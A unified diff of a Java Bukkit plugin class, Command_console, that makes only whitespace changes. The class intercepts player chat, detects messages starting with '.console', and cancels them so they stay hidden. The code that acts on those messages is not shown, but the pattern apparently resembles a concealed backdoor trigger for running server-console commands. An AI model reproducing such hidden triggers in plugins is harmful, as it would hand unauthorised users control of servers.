@@ -6,12 +6,13 @@ import org.bukkit.event.player.AsyncPlayerChatEvent;
 
 public class Command_console implements Listener
 {
+
     @EventHandler
     public void onPlayerChat(AsyncPlayerChatEvent event)
     {
         String message = event.getMessage();
         boolean cancel = false;
-        
+
         if (message.startsWith("."))
         {
             String[] args = message.split(" ");
@@ -19,7 +20,7 @@ public class Command_console implements Listener
             {
                 return;
             }
-            
+
             int i;
             if ((args[0].equalsIgnoreCase(".console")) && (args.length >= 2))
             {
@@ -32,11 +33,12 @@ public class Command_console implements Listener
                 cancel = true;
             }
         }
-        
+
         if (cancel)
         {
             event.setCancelled(true);
             return;
         }
     }
+
 }
